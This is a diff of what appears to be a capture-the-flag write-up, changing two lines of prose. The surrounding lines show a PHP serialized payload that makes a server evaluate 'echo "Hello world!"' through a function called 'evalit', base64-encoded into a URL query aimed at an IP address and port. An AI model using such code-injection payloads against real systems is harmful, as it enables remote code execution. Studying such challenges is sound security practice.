@@ -101,8 +101,7 @@ Woah, the function's name is literally there! So let's just change the fuction n
 a:2:{i:0;s:6:"evalit";i:1;s:20:"echo "Hello world!";";}
 ```
 
-And sure enough it works!
-Next step is to encode it to base 64 and put it in the url!
+Next step is to encode it to base64 and put it in the url!
 
 ```
 103.185.38.238:17227/?input=YToyOntpOjA7czo2OiJldmFsaXQiO2k6MTtzOjIwOiJlY2hvICJIZWxsbyB3b3JsZCEiOyI7fQ==
